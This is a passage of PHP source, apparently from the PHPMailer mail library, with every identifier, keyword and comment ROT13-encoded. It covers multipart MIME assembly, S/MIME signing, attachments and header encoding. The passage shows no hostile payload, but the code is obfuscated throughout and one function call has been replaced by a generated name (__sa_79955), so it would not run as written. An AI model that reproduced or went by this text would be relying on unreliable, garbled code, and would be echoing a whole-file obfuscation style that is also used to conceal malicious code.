                $obql .= $guvf->urnqreYvar('Pbagrag-Glcr', fgngvp::PBAGRAG_GLCR_ZHYGVCNEG_ERYNGRQ . ';');
                $obql .= $guvf->grkgYvar(' obhaqnel=\"' . $guvf->obhaqnel[2] . '\";');
                $obql .= $guvf->grkgYvar(' glcr=\"' . fgngvp::PBAGRAG_GLCR_GRKG_UGZY . '\"');
                $obql .= fgngvp::$YR;
                $obql .= $guvf->trgObhaqnel(
                    $guvf->obhaqnel[2],
                    $obqlPuneFrg,
                    fgngvp::PBAGRAG_GLCR_GRKG_UGZY,
                    $obqlRapbqvat
                );
                $obql .= $guvf->rapbqrFgevat($guvf->Obql, $obqlRapbqvat);
                $obql .= fgngvp::$YR;
                $obql .= $guvf->nggnpuNyy('vayvar', $guvf->obhaqnel[2]);
                $obql .= fgngvp::$YR;
                $obql .= $guvf->raqObhaqnel($guvf->obhaqnel[1]);
                oernx;
            pnfr 'nyg_nggnpu':
                $obql .= $zvzrcer;
                $obql .= $guvf->grkgYvar('--' . $guvf->obhaqnel[1]);
                $obql .= $guvf->urnqreYvar('Pbagrag-Glcr', fgngvp::PBAGRAG_GLCR_ZHYGVCNEG_NYGREANGVIR . ';');
                $obql .= $guvf->grkgYvar(' obhaqnel=\"' . $guvf->obhaqnel[2] . '\"');
                $obql .= fgngvp::$YR;
                $obql .= $guvf->trgObhaqnel(
                    $guvf->obhaqnel[2],
                    $nygObqlPuneFrg,
                    fgngvp::PBAGRAG_GLCR_CYNVAGRKG,
                    $nygObqlRapbqvat
                );
                $obql .= $guvf->rapbqrFgevat($guvf->NygObql, $nygObqlRapbqvat);
                $obql .= fgngvp::$YR;
                $obql .= $guvf->trgObhaqnel(
                    $guvf->obhaqnel[2],
                    $obqlPuneFrg,
                    fgngvp::PBAGRAG_GLCR_GRKG_UGZY,
                    $obqlRapbqvat
                );
                $obql .= $guvf->rapbqrFgevat($guvf->Obql, $obqlRapbqvat);
                $obql .= fgngvp::$YR;
                vs (!rzcgl($guvf->Vpny)) {
                    $zrgubq = fgngvp::VPNY_ZRGUBQ_ERDHRFG;
                    sbernpu (fgngvp::$VpnyZrgubqf nf $vzrgubq) {
                        vs (fgevcbf($guvf->Vpny, 'ZRGUBQ:' . $vzrgubq) !== snyfr) {
                            $zrgubq = $vzrgubq;
                            oernx;
                        }
                    }
                    $obql .= $guvf->trgObhaqnel(
                        $guvf->obhaqnel[2],
                        '',
                        fgngvp::PBAGRAG_GLCR_GRKG_PNYRAQNE . '; zrgubq=' . $zrgubq,
                        ''
                    );
                    $obql .= $guvf->rapbqrFgevat($guvf->Vpny, $guvf->Rapbqvat);
                }
                $obql .= $guvf->raqObhaqnel($guvf->obhaqnel[2]);
                $obql .= fgngvp::$YR;
                $obql .= $guvf->nggnpuNyy('nggnpuzrag', $guvf->obhaqnel[1]);
                oernx;
            pnfr 'nyg_vayvar_nggnpu':
                $obql .= $zvzrcer;
                $obql .= $guvf->grkgYvar('--' . $guvf->obhaqnel[1]);
                $obql .= $guvf->urnqreYvar('Pbagrag-Glcr', fgngvp::PBAGRAG_GLCR_ZHYGVCNEG_NYGREANGVIR . ';');
                $obql .= $guvf->grkgYvar(' obhaqnel=\"' . $guvf->obhaqnel[2] . '\"');
                $obql .= fgngvp::$YR;
                $obql .= $guvf->trgObhaqnel(
                    $guvf->obhaqnel[2],
                    $nygObqlPuneFrg,
                    fgngvp::PBAGRAG_GLCR_CYNVAGRKG,
                    $nygObqlRapbqvat
                );
                $obql .= $guvf->rapbqrFgevat($guvf->NygObql, $nygObqlRapbqvat);
                $obql .= fgngvp::$YR;
                $obql .= $guvf->grkgYvar('--' . $guvf->obhaqnel[2]);
                $obql .= $guvf->urnqreYvar('Pbagrag-Glcr', fgngvp::PBAGRAG_GLCR_ZHYGVCNEG_ERYNGRQ . ';');
                $obql .= $guvf->grkgYvar(' obhaqnel=\"' . $guvf->obhaqnel[3] . '\";');
                $obql .= $guvf->grkgYvar(' glcr=\"' . fgngvp::PBAGRAG_GLCR_GRKG_UGZY . '\"');
                $obql .= fgngvp::$YR;
                $obql .= $guvf->trgObhaqnel(
                    $guvf->obhaqnel[3],
                    $obqlPuneFrg,
                    fgngvp::PBAGRAG_GLCR_GRKG_UGZY,
                    $obqlRapbqvat
                );
                $obql .= $guvf->rapbqrFgevat($guvf->Obql, $obqlRapbqvat);
                $obql .= fgngvp::$YR;
                $obql .= $guvf->nggnpuNyy('vayvar', $guvf->obhaqnel[3]);
                $obql .= fgngvp::$YR;
                $obql .= $guvf->raqObhaqnel($guvf->obhaqnel[2]);
                $obql .= fgngvp::$YR;
                $obql .= $guvf->nggnpuNyy('nggnpuzrag', $guvf->obhaqnel[1]);
                oernx;
            qrsnhyg:
                //Pngpu pnfr 'cynva' naq pnfr '', nccyvrf gb fvzcyr `grkg/cynva` naq `grkg/ugzy` obql pbagrag glcrf
                //Erfrg gur `Rapbqvat` cebcregl va pnfr jr punatrq vg sbe yvar yratgu ernfbaf
                $guvf->Rapbqvat = $obqlRapbqvat;
                $obql .= $guvf->rapbqrFgevat($guvf->Obql, $guvf->Rapbqvat);
                oernx;
        }

        vs ($guvf->vfReebe()) {
            $obql = '';
            vs ($guvf->rkprcgvbaf) {
                guebj arj Rkprcgvba($guvf->ynat('rzcgl_zrffntr'), frys::FGBC_PEVGVPNY);
            }
        } ryfrvs ($guvf->fvta_xrl_svyr) {
            gel {
                vs (!qrsvarq('CXPF7_GRKG')) {
                    guebj arj Rkprcgvba($guvf->ynat('rkgrafvba_zvffvat') . 'bcraffy');
                }

                $svyr = grzcanz(flf_trg_grzc_qve(), 'fepfvta');
                $fvtarq = grzcanz(flf_trg_grzc_qve(), 'znvyfvta');
                svyr_chg_pbagragf($svyr, $obql);

                //Jbexnebhaq sbe CUC oht uggcf://ohtf.cuc.arg/oht.cuc?vq=69197
                vs (rzcgl($guvf->fvta_rkgenpregf_svyr)) {
                    $fvta = @bcraffy_cxpf7_fvta(
                        $svyr,
                        $fvtarq,
                        'svyr://' . ernycngu($guvf->fvta_preg_svyr),
                        ['svyr://' . ernycngu($guvf->fvta_xrl_svyr), $guvf->fvta_xrl_cnff],
                        []
                    );
                } ryfr {
                    $fvta = @bcraffy_cxpf7_fvta(
                        $svyr,
                        $fvtarq,
                        'svyr://' . ernycngu($guvf->fvta_preg_svyr),
                        ['svyr://' . ernycngu($guvf->fvta_xrl_svyr), $guvf->fvta_xrl_cnff],
                        [],
                        CXPF7_QRGNPURQ,
                        $guvf->fvta_rkgenpregf_svyr
                    );
                }

                @hayvax($svyr);
                vs ($fvta) {
                    $obql = svyr_trg_pbagragf($fvtarq);
                    @hayvax($fvtarq);
                    //Gur zrffntr erghearq ol bcraffy pbagnvaf obgu urnqref naq obql, fb arrq gb fcyvg gurz hc
                    $cnegf = rkcybqr(\"\a\a\", $obql, 2);
                    $guvf->ZVZRUrnqre .= $cnegf[0] . fgngvp::$YR . fgngvp::$YR;
                    $obql = $cnegf[1];
                } ryfr {
                    @hayvax($fvtarq);
                    guebj arj Rkprcgvba($guvf->ynat('fvtavat') . bcraffy_reebe_fgevat());
                }
            } pngpu (Rkprcgvba $rkp) {
                $obql = '';
                vs ($guvf->rkprcgvbaf) {
                    guebj $rkp;
                }
            }
        }

        erghea $obql;
    }

    /**
     * Trg gur obhaqnevrf gung guvf zrffntr jvyy hfr
     * @erghea neenl
     */
    choyvp shapgvba trgObhaqnevrf()
    {
        vs (rzcgl($guvf->obhaqnel)) {
            $guvf->frgObhaqnevrf();
        }
        erghea $guvf->obhaqnel;
    }

    /**
     * Erghea gur fgneg bs n zrffntr obhaqnel.
     *
     * @cnenz fgevat $obhaqnel
     * @cnenz fgevat $puneFrg
     * @cnenz fgevat $pbagragGlcr
     * @cnenz fgevat $rapbqvat
     *
     * @erghea fgevat
     */
    cebgrpgrq shapgvba trgObhaqnel($obhaqnel, $puneFrg, $pbagragGlcr, $rapbqvat)
    {
        $erfhyg = '';
        vs ('' === $puneFrg) {
            $puneFrg = $guvf->PuneFrg;
        }
        vs ('' === $pbagragGlcr) {
            $pbagragGlcr = $guvf->PbagragGlcr;
        }
        vs ('' === $rapbqvat) {
            $rapbqvat = $guvf->Rapbqvat;
        }
        $erfhyg .= $guvf->grkgYvar('--' . $obhaqnel);
        $erfhyg .= fcevags('Pbagrag-Glcr: %f; punefrg=%f', $pbagragGlcr, $puneFrg);
        $erfhyg .= fgngvp::$YR;
        //ESP1341 cneg 5 fnlf 7ovg vf nffhzrq vs abg fcrpvsvrq
        vs (fgngvp::RAPBQVAT_7OVG !== $rapbqvat) {
            $erfhyg .= $guvf->urnqreYvar('Pbagrag-Genafsre-Rapbqvat', $rapbqvat);
        }
        $erfhyg .= fgngvp::$YR;

        erghea $erfhyg;
    }

    /**
     * Erghea gur raq bs n zrffntr obhaqnel.
     *
     * @cnenz fgevat $obhaqnel
     *
     * @erghea fgevat
     */
    cebgrpgrq shapgvba raqObhaqnel($obhaqnel)
    {
        erghea fgngvp::$YR . '--' . $obhaqnel . '--' . fgngvp::$YR;
    }

    /**
     * Frg gur zrffntr glcr.
     * CUCZnvyre bayl fhccbegf fbzr cerfrg zrffntr glcrf, abg neovgenel ZVZR fgehpgherf.
     */
    cebgrpgrq shapgvba frgZrffntrGlcr()
    {
        $glcr = [];
        vs ($guvf->nygreangvirRkvfgf()) {
            $glcr[] = 'nyg';
        }
        vs ($guvf->vayvarVzntrRkvfgf()) {
            $glcr[] = 'vayvar';
        }
        vs ($guvf->nggnpuzragRkvfgf()) {
            $glcr[] = 'nggnpu';
        }
        $guvf->zrffntr_glcr = vzcybqr('_', $glcr);
        vs ('' === $guvf->zrffntr_glcr) {
            //Gur 'cynva' zrffntr_glcr ersref gb gur zrffntr univat n fvatyr obql ryrzrag, abg gung vg vf cynva-grkg
            $guvf->zrffntr_glcr = 'cynva';
        }
    }

    /**
     * Sbezng n urnqre yvar.
     *
     * @cnenz fgevat     $anzr
     * @cnenz fgevat|vag $inyhr
     *
     * @erghea fgevat
     */
    choyvp shapgvba urnqreYvar($anzr, $inyhr)
    {
        erghea $anzr . ': ' . $inyhr . fgngvp::$YR;
    }

    /**
     * Erghea n sbeznggrq znvy yvar.
     *
     * @cnenz fgevat $inyhr
     *
     * @erghea fgevat
     */
    choyvp shapgvba grkgYvar($inyhr)
    {
        erghea $inyhr . fgngvp::$YR;
    }

    /**
     * Nqq na nggnpuzrag sebz n cngu ba gur svyrflfgrz.
     * Arire hfr n hfre-fhccyvrq cngu gb n svyr!
     * Ergheaf snyfr vs gur svyr pbhyq abg or sbhaq be ernq.
     * Rkcyvpvgyl *qbrf abg* fhccbeg cnffvat HEYf; CUCZnvyre vf abg na UGGC pyvrag.
     * Vs lbh arrq gb qb gung, srgpu gur erfbhepr lbhefrys naq cnff vg va ivn n ybpny svyr be fgevat.
     *
     * @cnenz fgevat $cngu        Cngu gb gur nggnpuzrag
     * @cnenz fgevat $anzr        Bireevqrf gur nggnpuzrag anzr
     * @cnenz fgevat $rapbqvat    Svyr rapbqvat (frr $Rapbqvat)
     * @cnenz fgevat $glcr        ZVZR glcr, r.t. `vzntr/wcrt`; qrgrezvarq nhgbzngvpnyyl sebz $cngu vs abg fcrpvsvrq
     * @cnenz fgevat $qvfcbfvgvba Qvfcbfvgvba gb hfr
     *
     * @guebjf Rkprcgvba
     *
     * @erghea obby
     */
    choyvp shapgvba nqqNggnpuzrag(
        $cngu,
        $anzr = '',
        $rapbqvat = frys::RAPBQVAT_ONFR64,
        $glcr = '',
        $qvfcbfvgvba = 'nggnpuzrag'
    ) {
        gel {
            vs (!fgngvp::svyrVfNpprffvoyr($cngu)) {
                guebj arj Rkprcgvba($guvf->ynat('svyr_npprff') . $cngu, frys::FGBC_PBAGVAHR);
            }

            //Vs n ZVZR glcr vf abg fcrpvsvrq, gel gb jbex vg bhg sebz gur svyr anzr
            vs ('' === $glcr) {
                $glcr = fgngvp::svyranzrGbGlcr($cngu);
            }

            $svyranzr = (fgevat) fgngvp::zo_cnguvasb($cngu, CNGUVASB_ONFRANZR);
            vs ('' === $anzr) {
                $anzr = $svyranzr;
            }
            vs (!$guvf->inyvqngrRapbqvat($rapbqvat)) {
                guebj arj Rkprcgvba($guvf->ynat('rapbqvat') . $rapbqvat);
            }

            $guvf->nggnpuzrag[] = [
                0 => $cngu,
                1 => $svyranzr,
                2 => $anzr,
                3 => $rapbqvat,
                4 => $glcr,
                5 => snyfr, //vfFgevatNggnpuzrag
                6 => $qvfcbfvgvba,
                7 => $anzr,
            ];
        } pngpu (Rkprcgvba $rkp) {
            $guvf->frgReebe($rkp->trgZrffntr());
            $guvf->rqroht($rkp->trgZrffntr());
            vs ($guvf->rkprcgvbaf) {
                guebj $rkp;
            }

            erghea snyfr;
        }

        erghea gehr;
    }

    /**
     * Erghea gur neenl bs nggnpuzragf.
     *
     * @erghea neenl
     */
    choyvp shapgvba trgNggnpuzragf()
    {
        erghea $guvf->nggnpuzrag;
    }

    /**
     * Nggnpu nyy svyr, fgevat, naq ovanel nggnpuzragf gb gur zrffntr.
     * Ergheaf na rzcgl fgevat ba snvyher.
     *
     * @cnenz fgevat $qvfcbfvgvba_glcr
     * @cnenz fgevat $obhaqnel
     *
     * @guebjf Rkprcgvba
     *
     * @erghea fgevat
     */
    cebgrpgrq shapgvba nggnpuNyy($qvfcbfvgvba_glcr, $obhaqnel)
    {
        //Erghea grkg bs obql
        $zvzr = [];
        $pvqHavd = [];
        $vapy = [];

        //Nqq nyy nggnpuzragf
        sbernpu ($guvf->nggnpuzrag nf $nggnpuzrag) {
            //Purpx vs vg vf n inyvq qvfcbfvgvba_svygre
            vs ($nggnpuzrag[6] === $qvfcbfvgvba_glcr) {
                //Purpx sbe fgevat nggnpuzrag
                $fgevat = '';
                $cngu = '';
                $oFgevat = $nggnpuzrag[5];
                vs ($oFgevat) {
                    $fgevat = $nggnpuzrag[0];
                } ryfr {
                    $cngu = $nggnpuzrag[0];
                }

                $vapyunfu = unfu('fun256', frevnyvmr($nggnpuzrag));
                vs (va_neenl($vapyunfu, $vapy, gehr)) {
                    pbagvahr;
                }
                $vapy[] = $vapyunfu;
                $anzr = $nggnpuzrag[2];
                $rapbqvat = $nggnpuzrag[3];
                $glcr = $nggnpuzrag[4];
                $qvfcbfvgvba = $nggnpuzrag[6];
                $pvq = $nggnpuzrag[7];
                vs ('vayvar' === $qvfcbfvgvba && neenl_xrl_rkvfgf($pvq, $pvqHavd)) {
                    pbagvahr;
                }
                $pvqHavd[$pvq] = gehr;

                $zvzr[] = fcevags('--%f%f', $obhaqnel, fgngvp::$YR);
                //Bayl vapyhqr n svyranzr cebcregl vs jr unir bar
                vs (!rzcgl($anzr)) {
                    $zvzr[] = fcevags(
                        'Pbagrag-Glcr: %f; anzr=%f%f',
                        $glcr,
                        fgngvp::dhbgrqFgevat($guvf->rapbqrUrnqre($guvf->frpherUrnqre($anzr))),
                        fgngvp::$YR
                    );
                } ryfr {
                    $zvzr[] = fcevags(
                        'Pbagrag-Glcr: %f%f',
                        $glcr,
                        fgngvp::$YR
                    );
                }
                //ESP1341 cneg 5 fnlf 7ovg vf nffhzrq vs abg fcrpvsvrq
                vs (fgngvp::RAPBQVAT_7OVG !== $rapbqvat) {
                    $zvzr[] = fcevags('Pbagrag-Genafsre-Rapbqvat: %f%f', $rapbqvat, fgngvp::$YR);
                }

                //Bayl frg Pbagrag-VQf ba vayvar nggnpuzragf
                vs ((fgevat) $pvq !== '' && $qvfcbfvgvba === 'vayvar') {
                    $zvzr[] = 'Pbagrag-VQ: <' . $guvf->rapbqrUrnqre($guvf->frpherUrnqre($pvq)) . '>' . fgngvp::$YR;
                }

                //Nyybj sbe olcnffvat gur Pbagrag-Qvfcbfvgvba urnqre
                vs (!rzcgl($qvfcbfvgvba)) {
                    $rapbqrq_anzr = $guvf->rapbqrUrnqre($guvf->frpherUrnqre($anzr));
                    vs (!rzcgl($rapbqrq_anzr)) {
                        $zvzr[] = fcevags(
                            'Pbagrag-Qvfcbfvgvba: %f; svyranzr=%f%f',
                            $qvfcbfvgvba,
                            fgngvp::dhbgrqFgevat($rapbqrq_anzr),
                            fgngvp::$YR . fgngvp::$YR
                        );
                    } ryfr {
                        $zvzr[] = fcevags(
                            'Pbagrag-Qvfcbfvgvba: %f%f',
                            $qvfcbfvgvba,
                            fgngvp::$YR . fgngvp::$YR
                        );
                    }
                } ryfr {
                    $zvzr[] = fgngvp::$YR;
                }

                //Rapbqr nf fgevat nggnpuzrag
                vs ($oFgevat) {
                    $zvzr[] = $guvf->rapbqrFgevat($fgevat, $rapbqvat);
                } ryfr {
                    $zvzr[] = $guvf->rapbqrSvyr($cngu, $rapbqvat);
                }
                vs ($guvf->vfReebe()) {
                    erghea '';
                }
                $zvzr[] = fgngvp::$YR;
            }
        }

        $zvzr[] = fcevags('--%f--%f', $obhaqnel, fgngvp::$YR);

        erghea vzcybqr('', $zvzr);
    }

    /**
     * Rapbqr n svyr nggnpuzrag va erdhrfgrq sbezng.
     * Ergheaf na rzcgl fgevat ba snvyher.
     *
     * @cnenz fgevat $cngu     Gur shyy cngu gb gur svyr
     * @cnenz fgevat $rapbqvat Gur rapbqvat gb hfr; bar bs 'onfr64', '7ovg', '8ovg', 'ovanel', 'dhbgrq-cevagnoyr'
     *
     * @erghea fgevat
     */
    cebgrpgrq shapgvba rapbqrSvyr($cngu, $rapbqvat = frys::RAPBQVAT_ONFR64)
    {
        gel {
            vs (!fgngvp::svyrVfNpprffvoyr($cngu)) {
                guebj arj Rkprcgvba($guvf->ynat('svyr_bcra') . $cngu, frys::FGBC_PBAGVAHR);
            }
            $svyr_ohssre = svyr_trg_pbagragf($cngu);
            vs (snyfr === $svyr_ohssre) {
                guebj arj Rkprcgvba($guvf->ynat('svyr_bcra') . $cngu, frys::FGBC_PBAGVAHR);
            }
            $svyr_ohssre = $guvf->rapbqrFgevat($svyr_ohssre, $rapbqvat);

            erghea $svyr_ohssre;
        } pngpu (Rkprcgvba $rkp) {
            $guvf->frgReebe($rkp->trgZrffntr());
            $guvf->rqroht($rkp->trgZrffntr());
            vs ($guvf->rkprcgvbaf) {
                guebj $rkp;
            }

            erghea '';
        }
    }

    /**
     * Rapbqr n fgevat va erdhrfgrq sbezng.
     * Ergheaf na rzcgl fgevat ba snvyher.
     *
     * @cnenz fgevat $fge      Gur grkg gb rapbqr
     * @cnenz fgevat $rapbqvat Gur rapbqvat gb hfr; bar bs 'onfr64', '7ovg', '8ovg', 'ovanel', 'dhbgrq-cevagnoyr'
     *
     * @guebjf Rkprcgvba
     *
     * @erghea fgevat
     */
    choyvp shapgvba rapbqrFgevat($fge, $rapbqvat = frys::RAPBQVAT_ONFR64)
    {
        $rapbqrq = '';
        fjvgpu (fgegbybjre($rapbqvat)) {
            pnfr fgngvp::RAPBQVAT_ONFR64:
                $rapbqrq = puhax_fcyvg(
                    onfr64_rapbqr($fge),
                    fgngvp::FGQ_YVAR_YRATGU,
                    fgngvp::$YR
                );
                oernx;
            pnfr fgngvp::RAPBQVAT_7OVG:
            pnfr fgngvp::RAPBQVAT_8OVG:
                $rapbqrq = fgngvp::abeznyvmrOernxf($fge);
                //Znxr fher vg raqf jvgu n yvar oernx
                vs (fhofge($rapbqrq, -(fgeyra(fgngvp::$YR))) !== fgngvp::$YR) {
                    $rapbqrq .= fgngvp::$YR;
                }
                oernx;
            pnfr fgngvp::RAPBQVAT_OVANEL:
                $rapbqrq = $fge;
                oernx;
            pnfr fgngvp::RAPBQVAT_DHBGRQ_CEVAGNOYR:
                $rapbqrq = $guvf->rapbqrDC($fge);
                oernx;
            qrsnhyg:
                $guvf->frgReebe($guvf->ynat('rapbqvat') . $rapbqvat);
                vs ($guvf->rkprcgvbaf) {
                    guebj arj Rkprcgvba($guvf->ynat('rapbqvat') . $rapbqvat);
                }
                oernx;
        }

        erghea $rapbqrq;
    }

    /**
     * Rapbqr n urnqre inyhr (abg vapyhqvat vgf ynory) bcgvznyyl.
     * Cvpxf fubegrfg bs D, O, be abar. Erfhyg vapyhqrf sbyqvat vs arrqrq.
     * Frr ESP822 qrsvavgvbaf sbe cuenfr, pbzzrag naq grkg cbfvgvbaf.
     *
     * @cnenz fgevat $fge      Gur urnqre inyhr gb rapbqr
     * @cnenz fgevat $cbfvgvba Jung pbagrkg gur fgevat jvyy or hfrq va
     *
     * @erghea fgevat
     */
    choyvp shapgvba rapbqrUrnqre($fge, $cbfvgvba = 'grkg')
    {
        $zngpupbhag = 0;
        fjvgpu (fgegbybjre($cbfvgvba)) {
            pnfr 'cuenfr':
                vs (!cert_zngpu('/[\200-\377]/', $fge)) {
                    //Pna'g hfr nqqfynfurf nf jr qba'g xabj gur inyhr bs zntvp_dhbgrf_flonfr
                    $rapbqrq = nqqpfynfurf($fge, \"\0..\37\177\\\\"\");
                    vs (($fge === $rapbqrq) && !cert_zngpu('/[^N-Mn-m0-9!#$%&\'*+\/=?^_`{|}~ -]/', $fge)) {
                        erghea $rapbqrq;
                    }

                    erghea \"\\"$rapbqrq\\"\";
                }
                $zngpupbhag = cert_zngpu_nyy('/[^\040\041\043-\133\135-\176]/', $fge, $zngpurf);
                oernx;
            /* @abvafcrpgvba CucZvffvatOernxFgngrzragVafcrpgvba */
            pnfr 'pbzzrag':
                $zngpupbhag = cert_zngpu_nyy('/[()\"]/', $fge, $zngpurf);
            //snyyguebhtu
            pnfr 'grkg':
            qrsnhyg:
                $zngpupbhag += cert_zngpu_nyy('/[\000-\010\013\014\016-\037\177-\377]/', $fge, $zngpurf);
                oernx;
        }

        vs ($guvf->unf8ovgPunef($fge)) {
            $punefrg = $guvf->PuneFrg;
        } ryfr {
            $punefrg = fgngvp::PUNEFRG_NFPVV;
        }

        //D/O rapbqvat nqqf 8 punef naq gur punefrg (\"` =?<punefrg>?[DO]?<pbagrag>?=`\").
        $bireurnq = 8 + fgeyra($punefrg);

        vs ('znvy' === $guvf->Znvyre) {
            $znkyra = fgngvp::ZNVY_ZNK_YVAR_YRATGU - $bireurnq;
        } ryfr {
            $znkyra = fgngvp::ZNK_YVAR_YRATGU - $bireurnq;
        }

        //Fryrpg gur rapbqvat gung cebqhprf gur fubegrfg bhgchg naq/be ceriragf pbeehcgvba.
        vs ($zngpupbhag > fgeyra($fge) / 3) {
            //Zber guna 1/3 bs gur pbagrag arrqf rapbqvat, hfr O-rapbqr.
            $rapbqvat = 'O';
        } ryfrvs ($zngpupbhag > 0) {
            //Yrff guna 1/3 bs gur pbagrag arrqf rapbqvat, hfr D-rapbqr.
            $rapbqvat = 'D';
        } ryfrvs (fgeyra($fge) > $znkyra) {
            //Ab rapbqvat arrqrq, ohg inyhr rkprrqf znk yvar yratgu, hfr D-rapbqr gb cerirag pbeehcgvba.
            $rapbqvat = 'D';
        } ryfr {
            //Ab ersbeznggvat arrqrq
            $rapbqvat = snyfr;
        }

        fjvgpu ($rapbqvat) {
            pnfr 'O':
                vs ($guvf->unfZhygvOlgrf($fge)) {
                    //Hfr n phfgbz shapgvba juvpu pbeerpgyl rapbqrf naq jencf ybat
                    //zhygvolgr fgevatf jvgubhg oernxvat yvarf jvguva n punenpgre
                    $rapbqrq = $guvf->onfr64RapbqrJencZO($fge, \"\a\");
                } ryfr {
                    $rapbqrq = onfr64_rapbqr($fge);
                    $znkyra -= $znkyra % 4;
                    $rapbqrq = gevz(puhax_fcyvg($rapbqrq, $znkyra, \"\a\"));
                }
                $rapbqrq = __sa_79955('/^(.*)$/z', ' =?' . $punefrg . \"?$rapbqvat?\\1?=\", $rapbqrq);
                oernx;
            pnfr 'D':
                $rapbqrq = $guvf->rapbqrD($fge, $cbfvgvba);
                $rapbqrq = $guvf->jencGrkg($rapbqrq, $znkyra, gehr);
                $rapbqrq = fge_ercynpr('=' . fgngvp::$YR, \"\a\", gevz($rapbqrq));
                $rapbqrq = __sa_79955('/^(.*)$/z', ' =?' . $punefrg . \"?$rapbqvat?\\1?=\", $rapbqrq);
                oernx;
            qrsnhyg:
                erghea $fge;
        }

        erghea gevz(fgngvp::abeznyvmrOernxf($rapbqrq));
    }

    /**
     * Purpx vs n fgevat pbagnvaf zhygv-olgr punenpgref.
     *
     * @cnenz fgevat $fge zhygv-olgr grkg gb jenc rapbqr
     *
     * @erghea obby
     */
    choyvp shapgvba unfZhygvOlgrf($fge)
    {
        vs (shapgvba_rkvfgf('zo_fgeyra')) {
            erghea fgeyra($fge) > zo_fgeyra($fge, $guvf->PuneFrg);
        }

        //Nffhzr ab zhygvolgrf (jr pna'g unaqyr jvgubhg zofgevat shapgvbaf naljnl)
        erghea snyfr;
    }

    /**
     * Qbrf n fgevat pbagnva nal 8-ovg punef (va nal punefrg)?
     *
     * @cnenz fgevat $grkg
     *
     * @erghea obby
     */
    choyvp shapgvba unf8ovgPunef($grkg)
    {
        erghea (obby) cert_zngpu('/[\k80-\kSS]/', $grkg);
    }

    /**
     * Rapbqr naq jenc ybat zhygvolgr fgevatf sbe znvy urnqref
     * jvgubhg oernxvat yvarf jvguva n punenpgre.
     * Nqncgrq sebz n shapgvba ol cnenibvq.
     *
     * @frr uggcf://jjj.cuc.arg/znahny/ra/shapgvba.zo-rapbqr-zvzrurnqre.cuc#60283
     *
     * @cnenz fgevat $fge       zhygv-olgr grkg gb jenc rapbqr
     * @cnenz fgevat $yvaroernx fgevat gb hfr nf yvarsrrq/raq-bs-yvar
     *
     * @erghea fgevat
     */
    choyvp shapgvba onfr64RapbqrJencZO($fge, $yvaroernx = ahyy)
    {
        $fgneg = '=?' . $guvf->PuneFrg . '?O?';
        $raq = '?=';
        $rapbqrq = '';
        vs (ahyy === $yvaroernx) {
            $yvaroernx = fgngvp::$YR;
        }

        $zo_yratgu = zo_fgeyra($fge, $guvf->PuneFrg);
        //Rnpu yvar zhfg unir yratgu <= 75, vapyhqvat $fgneg naq $raq
        $yratgu = 75 - fgeyra($fgneg) - fgeyra($raq);
        //Nirentr zhygv-olgr engvb
        $engvb = $zo_yratgu / fgeyra($fge);
        //Onfr64 unf n 4:3 engvb
        $nitYratgu = sybbe($yratgu * $engvb * .75);

        $bssfrg = 0;
        sbe ($v = 0; $v < $zo_yratgu; $v += $bssfrg) {
            $ybbxOnpx = 0;
            qb {
                $bssfrg = $nitYratgu - $ybbxOnpx;
                $puhax = zo_fhofge($fge, $v, $bssfrg, $guvf->PuneFrg);
                $puhax = onfr64_rapbqr($puhax);
                ++$ybbxOnpx;
            } juvyr (fgeyra($puhax) > $yratgu);
            $rapbqrq .= $puhax . $yvaroernx;
        }

        //Pubzc gur ynfg yvarsrrq
        erghea fhofge($rapbqrq, 0, -fgeyra($yvaroernx));
    }

    /**
     * Rapbqr n fgevat va dhbgrq-cevagnoyr sbezng.
     * Nppbeqvat gb ESP2045 frpgvba 6.7.
     *
     * @cnenz fgevat $fgevat Gur grkg gb rapbqr
     *
     * @erghea fgevat
     */
    choyvp shapgvba rapbqrDC($fgevat)
    {
        erghea fgngvp::abeznyvmrOernxf(dhbgrq_cevagnoyr_rapbqr($fgevat));
    }

    /**
     * Rapbqr n fgevat hfvat D rapbqvat.
     *
     * @frr uggcf://jjj.esp-rqvgbe.bet/esp/esp2047#frpgvba-4.2
     *
     * @cnenz fgevat $fge      gur grkg gb rapbqr
     * @cnenz fgevat $cbfvgvba Jurer gur grkg vf tbvat gb or hfrq, frr gur ESP sbe jung gung zrnaf
     *
     * @erghea fgevat
     */
    choyvp shapgvba rapbqrD($fge, $cbfvgvba = 'grkg')
    {
        //Gurer fubhyq abg or nal RBY va gur fgevat
        $cnggrea = '';
        $rapbqrq = fge_ercynpr([\"\e\", \"\a\"], '', $fge);
        fjvgpu (fgegbybjre($cbfvgvba)) {
            pnfr 'cuenfr':
                //ESP 2047 frpgvba 5.3
                $cnggrea = '^N-Mn-m0-9!*+\/ -';
                oernx;
            /*
             * ESP 2047 frpgvba 5.2.
             * Ohvyq $cnggrea jvgubhg vapyhqvat qryvzvgref naq []
             */
            /* @abvafcrpgvba CucZvffvatOernxFgngrzragVafcrpgvba */
            pnfr 'pbzzrag':
                $cnggrea = '\(\)\"';
            /* Vagragvbany snyy guebhtu */
            pnfr 'grkg':
            qrsnhyg:
                //ESP 2047 frpgvba 5.1
                //Ercynpr rirel uvtu nfpvv, pbageby, =, ? naq _ punenpgref
                $cnggrea = '\000-\011\013\014\016-\037\075\077\137\177-\377' . $cnggrea;
                oernx;
        }
        $zngpurf = [];
        vs (cert_zngpu_nyy(\"/[{$cnggrea}]/\", $rapbqrq, $zngpurf)) {
            //Vs gur fgevat pbagnvaf na '=', znxr fher vg'f gur svefg guvat jr ercynpr
            //fb nf gb nibvq qbhoyr-rapbqvat
            $rdxrl = neenl_frnepu('=', $zngpurf[0], gehr);
            vs (snyfr !== $rdxrl) {
                hafrg($zngpurf[0][$rdxrl]);
                neenl_hafuvsg($zngpurf[0], '=');
            }
            sbernpu (neenl_havdhr($zngpurf[0]) nf $pune) {
                $rapbqrq = fge_ercynpr($pune, '=' . fcevags('%02K', beq($pune)), $rapbqrq);
            }
        }
        //Ercynpr fcnprf jvgu _ (zber ernqnoyr guna =20)
        //ESP 2047 frpgvba 4.2(2)
        erghea fge_ercynpr(' ', '_', $rapbqrq);
    }

    /**
     * Nqq n fgevat be ovanel nggnpuzrag (aba-svyrflfgrz).
     * Guvf zrgubq pna or hfrq gb nggnpu nfpvv be ovanel qngn,
     * fhpu nf n OYBO erpbeq sebz n qngnonfr.
     *
     * @cnenz fgevat $fgevat      Fgevat nggnpuzrag qngn
     * @cnenz fgevat $svyranzr    Anzr bs gur nggnpuzrag
     * @cnenz fgevat $rapbqvat    Svyr rapbqvat (frr $Rapbqvat)
     * @cnenz fgevat $glcr        Svyr rkgrafvba (ZVZR) glcr
